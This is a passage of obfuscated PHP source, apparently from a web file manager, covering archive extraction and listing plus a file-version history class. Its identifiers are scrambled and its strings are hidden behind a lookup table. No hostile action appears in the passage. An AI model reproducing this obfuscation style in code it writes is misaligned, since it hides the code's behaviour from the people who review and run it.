$ŒÅÆ²ø€->getType() == $¨şŒ«[119] ? $¯‘Ü‚›Ø : get_path_father($Ï­ÈÁö°->path); $½“ééÑ = rtrim($½“ééÑ, $¨şŒ«[8]) . $¨şŒ«[8]; mk_dir($½“ééÑ); } else { $÷–‹¤ê = TEMP_FILES . $¨şŒ«[1268] . time() . rand_string(8) . $¨şŒ«[8]; mk_dir($÷–‹¤ê); file_put_contents($÷–‹¤ê . $¨şŒ«[1269], $¨şŒ«[12]); $½“ééÑ = $÷–‹¤ê; } $àà®æ· = IO::info($½“ééÑ); if (!$àà®æ· || !$àà®æ·[$¨şŒ«[243]]) { show_json(LNG($¨şŒ«[1270]), !1); } $Ä˜Ïî‚ = self::zipFileList($¬³îÔÚş, $÷–‹¤ê); foreach ($Ä˜Ïî‚ as $ÖÒ¢ğÅˆ => $Æ±şÆ€Õ) { $Ä˜Ïî‚[$ÖÒ¢ğÅˆ] = self::iconvSystem($Æ±şÆ€Õ); } $©ªßñ¼ = get_filename_auto($½“ééÑ . $Òò´Ê¸, $¨şŒ«[12], $äß¶¼£Š); KodArchive::create(self::iconvSystem($©ªßñ¼), $Ä˜Ïî‚); if (!IO::exist($©ªßñ¼)) { if ($÷–‹¤ê) { del_dir($÷–‹¤ê); } write_log($¨şŒ«[1271] . $©ªßñ¼, $¨şŒ«[398]); show_json(LNG($¨şŒ«[1272]), !1); } if (!$÷–‹¤ê) { return $©ªßñ¼; } $¨§âøóî = self::move($©ªßñ¼, $¯‘Ü‚›Ø, $äß¶¼£Š); if ($÷–‹¤ê) { del_dir($÷–‹¤ê); } if (!$©ªßñ¼) { write_log($¨şŒ«[1273] . $©ªßñ¼ . $¨şŒ«[1274] . $¯‘Ü‚›Ø, $¨şŒ«[398]); show_json(LNG($¨şŒ«[1272]), !1); } return $¨§âøóî; } public static function unzip($§î«Ã»ó, $ó¥ˆü‘„, $Â‚Ü › = "\x2d\x31", $º°şß£„ = "\162\145\x70\x6c\141\143\145") { $ÓºÂÆ =& $_SERVER[ÕŸ²ó÷å]; $”’ôüıÆ = parent::info($§î«Ã»ó); if (!$”’ôüıÆ) { show_json(LNG($ÓºÂÆ[1275]), !1); } $¡ƒõƒê¢ = IO::infoFullSimple($ó¥ˆü‘„); if (!$¡ƒõƒê¢) { $ó¥ˆü‘„ = IO::mkdir($ó¥ˆü‘„); } if (isset($¡ƒõƒê¢[$ÓºÂÆ[203]]) && trim($¡ƒõƒê¢[$ÓºÂÆ[97]], $ÓºÂÆ[8]) != trim($ó¥ˆü‘„, $ÓºÂÆ[8])) { $‚ãœğ‚ = KodIO::make($¡ƒõƒê¢[$ÓºÂÆ[202]]); $°¥©ÎæÁ = IO::fileNameAuto($‚ãœğ‚, $¡ƒõƒê¢[$ÓºÂÆ[32]], REPEAT_RENAME_FOLDER, !0); $ó¥ˆü‘„ = IO::mkdir($‚ãœğ‚ . $°¥©ÎæÁ); } $Â‚Ü › = $Â‚Ü › && $Â‚Ü › != $ÓºÂÆ[1276] ? @json_decode($Â‚Ü ›, !0) : -1; $¼­İƒõ = self::unzipPart($§î«Ã»ó, $Â‚Ü ›); if (!$¼­İƒõ || !IO::exist($¼­İƒõ[$ÓºÂÆ[240]])) { show_json(LNG($ÓºÂÆ[118]), !1); } $ª€äÆªñ = $¼­İƒõ[$ÓºÂÆ[1277]][count($¼­İƒõ[$ÓºÂÆ[1277]]) - 1]; if ($ª€äÆªñ[$ÓºÂÆ[1278]] == -1 || substr($ª€äÆªñ[$ÓºÂÆ[32]], -1, 1) == $ÓºÂÆ[8]) { $¨¿¢Í = $¼­İƒõ[$ÓºÂÆ[1279]] . rand_string(10) . $ÓºÂÆ[8]; mk_dir($¨¿¢Í); $âş¦ıÀ× = count($¼­İƒõ[$ÓºÂÆ[1277]]) == 1 ? IO::ext($§î«Ã»ó) : get_path_ext($¼­İƒõ[$ÓºÂÆ[240]]); $¿°°«š = KodArchive::extract(self::iconvSystem($¼­İƒõ[$ÓºÂÆ[240]]), $¨¿¢Í, $ª€äÆªñ[$ÓºÂÆ[1278]], $°¥©ÎæÁ, $âş¦ıÀ×); self::unzipErrorCheck($¿°°«š, array($ÓºÂÆ[1280], $§î«Ã»ó, $âş¦ıÀ×, $ó¥ˆü‘„, $¼­İƒõ)); Hook::trigger($ÓºÂÆ[1281], $¨¿¢Í); recursion_dir($¨¿¢Í, $øõ™·é, $¬ú«Œ¸î, 0); $ÌˆõÏ´› = array_merge($øõ™·é, $¬ú«Œ¸î); $¶öÉË = array(); foreach ($ÌˆõÏ´› as $ãĞéÓ¡ ) { $âãœ£ — = IO::move(self::iconvApp($ãĞéÓ¡ ), $ó¥ˆü‘„, $º°şß£„); if ($âãœ£ —) { $¶öÉË[] = $âãœ£ —; } } del_dir($¨¿¢Í); } else { $âãœ£ — = IO::move($¼­İƒõ[$ÓºÂÆ[240]], $ó¥ˆü‘„, $º°şß£„, get_path_this($ª€äÆªñ[$ÓºÂÆ[32]])); if ($âãœ£ —) { $¶öÉË[] = $âãœ£ —; } } return $¶öÉË ? $¶öÉË : !1; } public static function unzipList($Åõìà²) { $å€ŠÙ¹Ï =& $_SERVER[ÕŸ²ó÷å]; $Ä§Ğ¥Íè = isset($Åõìà²[$å€ŠÙ¹Ï[1282]]) ? $Åõìà²[$å€ŠÙ¹Ï[1282]] : !1; $ñ‹•Ç¼ = isset($Åõìà²[$å€ŠÙ¹Ï[1278]]) ? @json_decode($Åõìà²[$å€ŠÙ¹Ï[1278]], !0) : -1; $“¼Ñ˜Ôó = self::unzipPart($Åõìà²[$å€ŠÙ¹Ï[97]], $ñ‹•Ç¼); if (!$“¼Ñ˜Ôó || !IO::exist($“¼Ñ˜Ôó[$å€ŠÙ¹Ï[240]])) { show_json(LNG($å€ŠÙ¹Ï[118]), !1); } $®§¸âÌã = $“¼Ñ˜Ôó[$å€ŠÙ¹Ï[1277]][count($“¼Ñ˜Ôó[$å€ŠÙ¹Ï[1277]]) - 1]; $×¢ÌÏÉÕ = in_array(IO::ext($“¼Ñ˜Ôó[$å€ŠÙ¹Ï[240]]), array($å€ŠÙ¹Ï[398], $å€ŠÙ¹Ï[1283], $å€ŠÙ¹Ï[1284], $å€ŠÙ¹Ï[1285], $å€ŠÙ¹Ï[1286], $å€ŠÙ¹Ï[1287])); if (!$Ä§Ğ¥Íè && ($®§¸âÌã[$å€ŠÙ¹Ï[1278]] == -1 || $×¢ÌÏÉÕ)) { $òÕ³çÄü = $“¼Ñ˜Ôó[$å€ŠÙ¹Ï[1279]] . get_path_this($“¼Ñ˜Ôó[$å€ŠÙ¹Ï[240]]) . $å€ŠÙ¹Ï[1288]; if (!IO::exist($òÕ³çÄü)) { $äğâ¼Äƒ = $®§¸âÌã[$å€ŠÙ¹Ï[1278]] == -1 ? get_path_ext(IO::pathThis($Åõìà²[$å€ŠÙ¹Ï[97]])) : get_path_ext($“¼Ñ˜Ôó[$å€ŠÙ¹Ï[240]]); $ú²›¶Ê» = KodArchive::listContent(self::iconvSystem($“¼Ñ˜Ôó[$å€ŠÙ¹Ï[240]]), !0, $äğâ¼Äƒ); self::unzipErrorCheck($ú²›¶Ê», array($å€ŠÙ¹Ï[1289], $Åõìà², $“¼Ñ˜Ôó)); @file_put_contents($òÕ³çÄü, json_encode($ú²›¶Ê»[$å€ŠÙ¹Ï[1290]])); } return @json_decode(IO::getContent($òÕ³çÄü), !0); } IO::fileOut($“¼Ñ˜Ôó[$å€ŠÙ¹Ï[240]], $Ä§Ğ¥Íè, get_path_this($®§¸âÌã[$å€ŠÙ¹Ï[32]])); die; } private static function zipFileList($Ï¸Ü‚“, $û‹®Ñå = false) { $»ş¦ñ õ =& $_SERVER[ÕŸ²ó÷å]; $ÎµØŒÎÖ = array(); foreach ($Ï¸Ü‚“ as $ôùóÁé†) { $ı«È»·à = $ôùóÁé†[$»ş¦ñ õ[97]]; if ($û‹®Ñå) { $ı«È»·à = self::copy($ôùóÁé†[$»ş¦ñ õ[97]], $û‹®Ñå, $»ş¦ñ õ[902]); } else { $‹ÛÌìúô = self::init($ôùóÁé†[$»ş¦ñ õ[97]]); if ($‹ÛÌìúô->getType() == $»ş¦ñ õ[119]) { $ı«È»·à = $‹ÛÌìúô->path; } } if ($ı«È»·à && self::local()->exist($ı«È»·à)) { $ÎµØŒÎÖ[$ôùóÁé†[$»ş¦ñ õ[97]]] = $ı«È»·à; } } if (!empty($ÎµØŒÎÖ)) { return array_values($ÎµØŒÎÖ); } show_json(LNG($»ş¦ñ õ[1249]), !1); } private static function localFilePath($É‹¡„’¦) { $ô§¦¶¸“ =& $_SERVER[ÕŸ²ó÷å]; $›û˜šÎ  = KodIO::parse($É‹¡„’¦); if ($›û˜šÎ [$ô§¦¶¸“[33]] == KodIO::KOD_SOURCE) { $üÈèÁÒÉ = Model($ô§¦¶¸“[908])->fileInfoGet(KodIO::sourceID($É‹¡„’¦)); if (!$üÈèÁÒÉ[$ô§¦¶¸“[97]]) { show_json($ô§¦¶¸“[1291], !1); } $É‹¡„’¦ = $üÈèÁÒÉ[$ô§¦¶¸“[97]]; } $ºóŠ—ÕÛ = self::init($É‹¡„’¦); if ($ºóŠ—ÕÛ->pathParse[$ô§¦¶¸“[1235]]) { $É‹¡„’¦ = $ºóŠ—ÕÛ->pathParse[$ô§¦¶¸“[1235]]; $ºóŠ—ÕÛ = self::init($É‹¡„’¦); } $¦Ø¬Í¬Ï = $ºóŠ—ÕÛ->getType(); if ($¦Ø¬Í¬Ï == $ô§¦¶¸“[119] || $¦Ø¬Í¬Ï == $ô§¦¶¸“[1292]) { if (!$ºóŠ—ÕÛ->exist($ºóŠ—ÕÛ->path)) { show_json(LNG($ô§¦¶¸“[118]), !1); } return $ºóŠ—ÕÛ->path; } return !1; } public static function unzipPart($õ©¥°šÂ, $Óª­î–í = -1) { $ãµ“»ª =& $_SERVER[ÕŸ²ó÷å]; $§ô³Â¤Ğ = IO::pathThis($õ©¥°šÂ); if (!$Óª­î–í || $Óª­î–í == -1) { $û¡á¤Ø‰ = array(array($ãµ“»ª[32] => $§ô³Â¤Ğ, $ãµ“»ª[1278] => -1)); $û¡á¤Ø‰[0][$ãµ“»ª[1293]] = $û¡á¤Ø‰[0][$ãµ“»ª[32]]; } else { if (is_array($Óª­î–í)) { $û¡á¤Ø‰ = $Óª­î–í; $êøöõñ = count($û¡á¤Ø‰) - 1; for ($çóë›™¥ = 0; $çóë›™¥ <= $êøöõñ; $çóë›™¥++) { $õ™Â…›¡ = $û¡á¤Ø‰[$çóë›™¥]; $ğöø¥ñ– = get_path_this($õ™Â…›¡[$ãµ“»ª[32]]) . (checkExtSafe($õ™Â…›¡[$ãµ“»ª[32]]) ? $ãµ“»ª[12] : $ãµ“»ª[1294]); $û¡á¤Ø‰[$çóë›™¥][$ãµ“»ª[1293]] = $ãµ“»ª[1295] . intval($õ™Â…›¡[$ãµ“»ª[1278]]) . $ãµ“»ª[471] . $ğöø¥ñ–; if ($çóë›™¥ == 0) { continue; } $û¡á¤Ø‰[$çóë›™¥][$ãµ“»ª[1293]] = $û¡á¤Ø‰[$çóë›™¥ - 1][$ãµ“»ª[1293]] . $ãµ“»ª[1296] . $û¡á¤Ø‰[$çóë›™¥][$ãµ“»ª[1293]]; } } } if (!is_array($û¡á¤Ø‰) || count($û¡á¤Ø‰) == 0) { return !1; } $ôÃˆõÊı = $û¡á¤Ø‰[count($û¡á¤Ø‰) - 1]; if (!IO::exist($õ©¥°šÂ)) { return !1; } $ªŠ‹Éõ = TEMP_FILES . $ãµ“»ª[1297] . kodIO::hashPathSafe($õ©¥°šÂ) . $ãµ“»ª[8]; $İúß«  = $ªŠ‹Éõ . $ôÃˆõÊı[$ãµ“»ª[1293]]; mk_dir($ªŠ‹Éõ); file_put_contents(TEMP_FILES . $ãµ“»ª[1269], $ãµ“»ª[12]); if (IO::exist($İúß« )) { return array($ãµ“»ª[240] => $İúß« , $ãµ“»ª[1277] => $û¡á¤Ø‰, $ãµ“»ª[1279] => $ªŠ‹Éõ); } $¡£·ÕêÏ = self::localFilePath($õ©¥°šÂ); if (!$¡£·ÕêÏ) { $¡£·ÕêÏ = $ªŠ‹Éõ . $ãµ“»ª[1298]; if (!IO::exist($¡£·ÕêÏ)) { self::copy($õ©¥°šÂ, $ªŠ‹Éõ, !1, get_path_this($¡£·ÕêÏ)); } } if (!$¡£·ÕêÏ || !IO::exist($¡£·ÕêÏ)) { return !1; } if ($ôÃˆõÊı[$ãµ“»ª[1278]] == -1) { return array($ãµ“»ª[240] => $¡£·ÕêÏ, $ãµ“»ª[1277] => $û¡á¤Ø‰, $ãµ“»ª[1279] => $ªŠ‹Éõ); } $âÀ§á·± = $¡£·ÕêÏ; foreach ($û¡á¤Ø‰ as $çóë›™¥ => $õ™Â…›¡) { if (!$õ™Â…›¡ || $õ™Â…›¡[$ãµ“»ª[1278]] == $ãµ“»ª[1276]) { break; } if (substr($õ™Â…›¡[$ãµ“»ª[32]], -1, 1) == $ãµ“»ª[8]) { break; } $Îœú¯‘ = in_array(get_path_ext($õ™Â…›¡[$ãµ“»ª[1293]]), array($ãµ“»ª[398], $ãµ“»ª[1283], $ãµ“»ª[1284], $ãµ“»ª[1285], $ãµ“»ª[1286], $ãµ“»ª[1287])); $¦Æ®‚Ç– = $çóë›™¥ == count($û¡á¤Ø‰) - 1 && $Îœú¯‘; $âø•Ğ“ = $ªŠ‹Éõ . $õ™Â…›¡[$ãµ“»ª[1293]]; $÷Ò›ùË¨ = $ªŠ‹Éõ . get_path_this($õ™Â…›¡[$ãµ“»ª[32]]); if (IO::exist($âø•Ğ“)) { $âÀ§á·± = $âø•Ğ“; continue; } $ìˆ ’— = $çóë›™¥ == 0 ? get_path_ext($§ô³Â¤Ğ) : get_path_ext($âÀ§á·±); $ÉÌ áì¥ = KodArchive::extract(self::iconvSystem($âÀ§á·±), $ªŠ‹Éõ, $õ™Â…›¡[$ãµ“»ª[1278]], $¿ÒšôÍ», $ìˆ ’—); self::unzipErrorCheck($ÉÌ áì¥, array($ãµ“»ª[1299], $õ©¥°šÂ, $û¡á¤Ø‰, $õ™Â…›¡, $âø•Ğ“)); if (IO::exist($÷Ò›ùË¨)) { IO::rename($÷Ò›ùË¨, get_path_this($âø•Ğ“)); } $âÀ§á·± = $âø•Ğ“; } $İúß«  = $âÀ§á·±; return array($ãµ“»ª[240] => $âÀ§á·±, $ãµ“»ª[1277] => $û¡á¤Ø‰, $ãµ“»ª[1279] => $ªŠ‹Éõ); } private static function unzipErrorCheck($¸ŠòÄ¿Ã, $á€¹¨ìÈ = false) { $Å²¶¸¦å =& $_SERVER[ÕŸ²ó÷å]; if ($¸ŠòÄ¿Ã[$Å²¶¸¦å[1300]]) { return !0; } write_log(array($Å²¶¸¦å[1301], $¸ŠòÄ¿Ã, $á€¹¨ìÈ), $Å²¶¸¦å[1302]); show_json($Å²¶¸¦å[1303] . json_encode($¸ŠòÄ¿Ã[$Å²¶¸¦å[1290]]), !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $½–´ÇúÉ =& $_SERVER[ÕŸ²ó÷å]; $‹ì„ÔøÈ = $GLOBALS[$½–´ÇúÉ[6]][$½–´ÇúÉ[102]]; if ($‹ì„ÔøÈ[$½–´ÇúÉ[1304]] != 1) { return; } if ($‹ì„ÔøÈ[$½–´ÇúÉ[1305]] <= 0) { return; } if (isset($_REQUEST[$½–´ÇúÉ[1306]]) && $_REQUEST[$½–´ÇúÉ[1306]] == $½–´ÇúÉ[101]) { return; } Hook::bind($½–´ÇúÉ[1307], $½–´ÇúÉ[1308]); Hook::bind($½–´ÇúÉ[1309], $½–´ÇúÉ[1310]); Hook::bind($½–´ÇúÉ[1311], $½–´ÇúÉ[1312]); Hook::bind($½–´ÇúÉ[1313], $½–´ÇúÉ[1314]); Hook::bind($½–´ÇúÉ[1315], $½–´ÇúÉ[1316]); Hook::bind($½–´ÇúÉ[1317], $½–´ÇúÉ[1318]); } public static function eventBeforeUpload($Ú°»ëÑ) { if ($Ú°»ëÑ[3] && $Ú°»ëÑ[3] != REPEAT_REPLACE) { return; } $ñæ´ÁÂş = self::parsePath($Ú°»ëÑ[0]); if (!$ñæ´ÁÂş) { return; } self::add($ñæ´ÁÂş); } public static function eventBeforeEdit($äİí¼Øà) { $ÏÁ£‰‡ = self::parsePath($äİí¼Øà[0]); if (!$ÏÁ£‰‡) { return; } self::add($ÏÁ£‰‡); } public static function eventBeforeCopyFile($øÒÂÎÚ…, $ë¹×Ë, $ù¤£ìßõ, $ø¤é×Ù‰, $ÚŞïóÆÂ, $Ñ‹”€™¬) { $ÜØòø =& $_SERVER[ÕŸ²ó÷å]; if (isset($ù¤£ìßõ->_data[$ÜØòø[1239]]) && $ù¤£ìßõ->_data[$ÜØòø[1239]]) { return; } $³Ì¸ùèÀ = $ù¤£ìßõ->getPathOuter($ø¤é×Ù‰); $¢ ë‰¾û = self::parsePath($³Ì¸ùèÀ); if (!$¢ ë‰¾û) { return; } self::add($¢ ë‰¾û); } public static function eventBeforeRename($£»¹Õäõ) { $°ã²¯ =& $_SERVER[ÕŸ²ó÷å]; $ÂêùëÔ = self::parsePath($£»¹Õäõ[0]); if (!$ÂêùëÔ) { return; } $½ØÚ÷â = self::checkInHistory($ÂêùëÔ); if (!$½ØÚ÷â) { return; } if ($½ØÚ÷â[$°ã²¯[33]] == $°ã²¯[240]) { $ñÍ£¸„Ğ = self::listData($ÂêùëÔ); if ($ñÍ£¸„Ğ && $ñÍ£¸„Ğ[$°ã²¯[454]]) { self::moveHistory($ÂêùëÔ, $£»¹Õäõ[1]); } } else { IO::rename($½ØÚ÷â[$°ã²¯[97]], $£»¹Õäõ[1]); } } public static function eventBeforeMove($âÓ‡­Ãí) { $î«²¸°á =& $_SERVER[ÕŸ²ó÷å]; $·Íê¾ª§ = self::parsePath($âÓ‡­Ãí[0]); if (!$·Íê¾ª§) { return; } $¸«À¨ = self::parsePath($âÓ‡­Ãí[1]); if (!$¸«À¨) { return; } $Ê¾Ë„• = $âÓ‡­Ãí[3]; $ÌÄñÕÖÙ = self::checkInHistory($·Íê¾ª§); if (!$ÌÄñÕÖÙ) { return; } $èßŸ²ş‘ = self::pathHistory($¸«À¨); if ($ÌÄñÕÖÙ[$î«²¸°á[33]] == $î«²¸°á[240]) { $ÌÁ®Ìù‘ = self::listData($·Íê¾ª§); $Çà¤´ô³ = rtrim($¸«À¨, $î«²¸°á[8]) . $î«²¸°á[8] . ($Ê¾Ë„• ? $Ê¾Ë„• : get_path_this($·Íê¾ª§)); $ˆÜ–èæ  = self::listData($Çà¤´ô³); if ($ÌÁ®Ìù‘ && $ÌÁ®Ìù‘[$î«²¸°á[454]] && $ˆÜ–èæ  && $ˆÜ–èæ [$î«²¸°á[454]]) { return self::clear($·Íê¾ª§); } if ($ÌÁ®Ìù‘ && $ÌÁ®Ìù‘[$î«²¸°á[454]]) { self::moveHistory($·Íê¾ª§, $Ê¾Ë„•, $èßŸ²ş‘); } } else { IO::move($ÌÄñÕÖÙ[$î«²¸°á[97]], $èßŸ²ş‘, !1, $Ê¾Ë„•); self::clearEmptyFolder(IO::pathFather($ÌÄñÕÖÙ[$î«²¸°á[97]])); } } public static function eventAfterRemove($Ìí»³ĞÏ, $ÓçƒıÊé) { $²½˜Œä³ =& $_SERVER[ÕŸ²ó÷å]; if (!$ÓçƒıÊé) { return; } $¹âÔÚó³ = self::parsePath($Ìí»³ĞÏ[0]); if (!$¹âÔÚó³) { return; } $ÇÛÅÃ £ = self::checkInHistory($¹âÔÚó³); if (!$ÇÛÅÃ £) { return; } if ($ÇÛÅÃ £[$²½˜Œä³[33]] == $²½˜Œä³[240]) { $ûºÉ©ÆÔ = self::listData($¹âÔÚó³, !1); if ($ûºÉ©ÆÔ && $ûºÉ©ÆÔ[$²½˜Œä³[454]]) { self::clear($¹âÔÚó³, !1); } } else { IO::remove($ÇÛÅÃ £[$²½˜Œä³[97]]); self::clearEmptyFolder(IO::pathFather($ÇÛÅÃ £[$²½˜Œä³[97]])); } } private static function checkInHistory($Óù½¡ê) { $ÑÓëñá¸ = self::pathHistory($Óù½¡ê); if (!IO::exist($ÑÓëñá¸)) { $ÑÓëñá¸ .= $_SERVER[ÕŸ²ó÷å][1319]; } return IO::exist($ÑÓëñá¸) ? IO::info($ÑÓëñá¸) : !1; } private static function parsePath($˜ç³±Ù) { $Š±“Í²Ï =& $_SERVER[ÕŸ²ó÷å]; if (!$˜ç³±Ù) { return !1; } if (isset($GLOBALS[$Š±“Í²Ï[1320]]) && $GLOBALS[$Š±“Í²Ï[1320]]) { return; } $Ñ°§ƒ¥³ = KodIO::parse($˜ç³±Ù); $îÒ‹‘¢ = $Ñ°§ƒ¥³[$Š±“Í²Ï[33]]; $„İËÏ¢„ = !$îÒ‹‘¢ || $îÒ‹‘¢ == KodIO::KOD_IO || $îÒ‹‘¢ == KodIO::KOD_SHARE_ITEM; if (!$„İËÏ¢„ || !$Ñ°§ƒ¥³[$Š±“Í²Ï[1321]]) { return !1; } if (substr($˜ç³±Ù, 0, strlen(DATA_PATH . $Š±“Í²Ï[1322])) == DATA_PATH . $Š±“Í²Ï[1322]) { return !1; } if ($îÒ‹‘¢ == KodIO::KOD_SHARE_ITEM) { $Ü²‘ˆÈš = IO::init($˜ç³±Ù); if ($Ü²‘ˆÈš->pathParse[$Š±“Í²Ï[1235]]) { return self::parsePath($Ü²‘ˆÈš->pathParse[$Š±“Í²Ï[1235]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $ç„Ïš = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $Š±“Í²Ï[1323]); foreach ($ç„Ïš as $öË±„êÎ) { if (!$îÒ‹‘¢ && substr($˜ç³±Ù, 0, strlen($öË±„êÎ)) == $öË±„êÎ) { return !1; } } self::log($GLOBALS[$Š±“Í²Ï[1230]] . $Š±“Í²Ï[1324] . $˜ç³±Ù); return $˜ç³±Ù; } private static function pathHistory($å¢”±º¶) { $¢ÜÌ†û¼ =& $_SERVER[ÕŸ²ó÷å]; $±ÜÑê€ = self::$_historyBase . ltrim(KodIO::clear($å¢”±º¶), $¢ÜÌ†û¼[8]); $±ÜÑê€ = str_replace(array($¢ÜÌ†û¼[1325]), array($¢ÜÌ†û¼[1326]), $±ÜÑê€); return $±ÜÑê€; } public static function log($åñĞ¦¾Ù) { } public static function historyCount($»Şîàå ) { $¯®ßÓåü =& $_SERVER[ÕŸ²ó÷å]; $üÔğËüë = array(); $Ê½á› = array(); foreach ($»Şîàå  as $•¾®…’û) { $ŒïÛÚœ¼ = get_path_father($•¾®…’û); if (!$Ê½á›[$ŒïÛÚœ¼]) { $Ê½á›[$ŒïÛÚœ¼] = array(); } $Ê½á›[$ŒïÛÚœ¼][] = get_path_this($•¾®…’û); } foreach ($Ê½á› as $ŒïÛÚœ¼ => $áºÊöÛå) { $ò¾¨ÊÏÕ = self::parsePath($ŒïÛÚœ¼); if (!$ò¾¨ÊÏÕ) { continue; } foreach ($áºÊöÛå as $˜¸ÙİêÇ) { $·€ö¢æ˜ = self::listData(rtrim($ò¾¨ÊÏÕ, $¯®ßÓåü[8]) . $¯®ßÓåü[8] . $˜¸ÙİêÇ, !1); if ($·€ö¢æ˜ && $·€ö¢æ˜[$¯®ßÓåü[454]]) { $üÔğËüë[rtrim($ŒïÛÚœ¼, $¯®ßÓåü[8]) . $¯®ßÓåü[8] . $˜¸ÙİêÇ] = count($·€ö¢æ˜[$¯®ßÓåü[454]]); } } } return $üÔğËüë; } public static function add($®¾‡Ìİ) { $­¢·£ĞÄ =& $_SERVER[ÕŸ²ó÷å]; $ÚÚùı€¥ = self::listData($®¾‡Ìİ); if (!$ÚÚùı€¥) { return; } $ÆÅñæ»Ü = Model($­¢·£ĞÄ[854])->get($­¢·£ĞÄ[1327]); $Å™Ö…¡ó = intval($GLOBALS[$­¢·£ĞÄ[6]][$­¢·£ĞÄ[102]][$­¢·£ĞÄ[1305]]); $Â·ûü¶û = $ÆÅñæ»Ü == $­¢·£ĞÄ[1328] ? min(5, $Å™Ö…¡ó) : $Å™Ö…¡ó; if ($Å™Ö…¡ó <= 0) { return; } $ûŒ´Œ—Â = IO::info($®¾‡Ìİ); $©‘®çµ = $ÚÚùı€¥[$­¢·£ĞÄ[454]]; if ($ûŒ´Œ—Â[$­¢·£ĞÄ[89]] == 0) { return; } if ($ûŒ´Œ—Â[$­¢·£ĞÄ[89]] >= 1024 * 1024 * 500) { return !1; } $óå™½–¿ = IO::hashSimple($®¾‡Ìİ); if ($©‘®çµ && $©‘®çµ[0][$­¢·£ĞÄ[681]] == $óå™½–¿) { return !0; } if (array_key_exists($­¢·£ĞÄ[243], $ûŒ´Œ—Â) && !$ûŒ´Œ—Â[$­¢·£ĞÄ[243]]) { return !1; } $¤ØÊ¯úó = short_id(time()); $ë®»­ = array($­¢·£ĞÄ[484] => $¤ØÊ¯úó, $­¢·£ĞÄ[681] => $óå™½–¿, $­¢·£ĞÄ[32] => $ûŒ´Œ—Â[$­¢·£ĞÄ[32]] . $­¢·£ĞÄ[10] . date($­¢·£ĞÄ[1329]) . rand_string(1), $­¢·£ĞÄ[89] => $ûŒ´Œ—Â[$­¢·£ĞÄ[89]], $­¢·£ĞÄ[536] => USER_ID, $­¢·£ĞÄ[241] => time(), $­¢·£ĞÄ[1330] => $­¢·£ĞÄ[12]); IO::mkdir($ÚÚùı€¥[$­¢·£ĞÄ[1331]]); $—âÉ¥ = IO::copy($®¾‡Ìİ, $ÚÚùı€¥[$­¢·£ĞÄ[1331]], !1, $ë®»­[$­¢·£ĞÄ[32]]); if (!$—âÉ¥) { self::clearEmptyFolder($ÚÚùı€¥[$­¢·£ĞÄ[1331]]); return !1; } array_unshift($©‘®çµ, $ë®»­); if (count($©‘®çµ) > $Â·ûü¶û) { $çì¡¥òº = array_slice($©‘®çµ, $Â·ûü¶û); foreach ($çì¡¥òº as $ˆ©ÚÔºç) { IO::remove($ÚÚùı€¥[$­¢·£ĞÄ[1331]] . $ˆ©ÚÔºç[$­¢·£ĞÄ[32]]); } $©‘®çµ = array_slice($©‘®çµ, 0, $Â·ûü¶û); } return self::saveData($ÚÚùı€¥[$­¢·£ĞÄ[1332]], $©‘®çµ); } public static function remove($¦ø™×Ãö, $ğ´Š·ı) { $ş”•½«Ã =& $_SERVER[ÕŸ²ó÷å]; $üÊ¹İò‘ = self::listData($¦ø™×Ãö); $áØí³í‰ = array(); if (!$üÊ¹İò‘) { return !1; } foreach ($üÊ¹İò‘[$ş”•½«Ã[454]] as $“…”ÀŞØ) { if ($“…”ÀŞØ[$ş”•½«Ã[484]] == $ğ´Š·ı) { IO::remove($üÊ¹İò‘[$ş”•½«Ã[1331]] . $“…”ÀŞØ[$ş”•½«Ã[32]]); continue; } $áØí³í‰[] = $“…”ÀŞØ; } return self::saveData($üÊ¹İò‘[$ş”•½«Ã[1332]], $áØí³í‰); } public static function clear($ÉÈ€¡², $ƒå™ËŒ = true) { $íÎÒ±‹ =& $_SERVER[ÕŸ²ó÷å]; $Œ÷œ³ˆÕ = self::listData($ÉÈ€¡², $ƒå™ËŒ); if (!$Œ÷œ³ˆÕ) { return !1; } foreach ($Œ÷œ³ˆÕ[$íÎÒ±‹[454]] as $·ØÕš‰Æ) { IO::remove($Œ÷œ³ˆÕ[$íÎÒ±‹[1331]] . $·ØÕš‰Æ[$íÎÒ±‹[32]]); } return self::saveData($Œ÷œ³ˆÕ[$íÎÒ±‹[1332]], array()); } public static function moveHistory($š–“á÷µ, $—ççèšÈ = '', $­³ş˜¯ = '') { $¯²òí£ö =& $_SERVER[ÕŸ²ó÷å]; $É£Ìëû = self::listData($š–“á÷µ, !1); if (!$É£Ìëû || !$É£Ìëû[$¯²òí£ö[454]]) { return !1; } $åš½Íäê = $¯²òí£ö[1319]; $—ççèšÈ = $—ççèšÈ ? $—ççèšÈ : get_path_this($š–“á÷µ); $­³ş˜¯ = $­³ş˜¯ ? $­³ş˜¯ : $É£Ìëû[$¯²òí£ö[1331]]; $òÏòš¨ë = substr(get_path_this($É£Ìëû[$¯²òí£ö[1332]]), 0, -strlen($åš½Íäê)); foreach ($É£Ìëû[$¯²òí£ö[454]] as $Æ©ï®ˆö => $ºƒĞŞƒ) { $ƒª‹èò = $—ççèšÈ . substr($ºƒĞŞƒ[$¯²òí£ö[32]], strlen($òÏòš¨ë)); $ğ…æ•êŠ = IO::move($É£Ìëû[$¯²òí£ö[1331]] . $ºƒĞŞƒ[$¯²òí£ö[32]], $­³ş˜¯, !1, $ƒª‹èò); if ($ğ…æ•êŠ) { $É£Ìëû[$¯²òí£ö[454]][$Æ©ï®ˆö][$¯²òí£ö[32]] = $ƒª‹èò; } } $É£Ìëû[$¯²òí£ö[1332]] = IO::move($É£Ìëû[$¯²òí£ö[1332]], $­³ş˜¯, !1, $—ççèšÈ . $åš½Íäê); self::saveData($É£Ìëû[$¯²òí£ö[1332]], $É£Ìëû[$¯²òí£ö[454]]); self::clearEmptyFolder($É£Ìëû[$¯²òí£ö[1331]]); } public static function rollback($†û«üıû, $¨¤ÕÍÉç) { $Àš°ú¾® =& $_SERVER[ÕŸ²ó÷å]; $ÏÑ—‚º» = self::listData($†û«üıû); if (!$ÏÑ—‚º») { return; } $÷‹——‡» = IO::info($†û«üıû); foreach ($ÏÑ—‚º»[$Àš°ú¾®[454]] as $†¦ßØË½ => $ç×—®) { if ($ç×—®[$Àš°ú¾®[484]] == $¨¤ÕÍÉç) { self::add($†û«üıû); $½•—§œª = $ÏÑ—‚º»[$Àš°ú¾®[1331]] . $ç×—®[$Àš°ú¾®[32]]; $ÅüÔïî² = IO::copy($½•—§œª, IO::pathFather($†û«üıû), 